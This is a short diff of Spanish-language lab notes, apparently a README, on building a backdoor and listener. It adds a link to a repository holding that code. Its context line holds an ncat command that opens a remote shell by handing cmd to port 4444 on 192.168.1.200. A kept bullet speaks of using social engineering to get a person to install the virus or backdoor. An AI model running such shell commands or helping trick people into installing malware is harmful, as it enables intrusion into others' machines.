@@ -50,6 +50,10 @@ ncat -v 192.168.1.200 4444 -e cmd
 
 # Por supuesto aqui estamos haciendo pruebas de nuestro backdoor. 
 * Tenemos que usar un lenguaje y escribir nuestro codigo y crear un archivo executable tanto en linux como en windows.
-* Y usar ingenieria social para hacer que esa persona instale nuestro virus, backdoor..etc.
+# El desarrollo del backddor y listener se encuentra en el siguente repo > https://github.com/tmcyberagent/BACKDOOR-LABORATORIO-
+
+
+
+* Y por suspuesto > usar ingenieria social para hacer que esa persona instale nuestro virus, backdoor..etc.
 
 
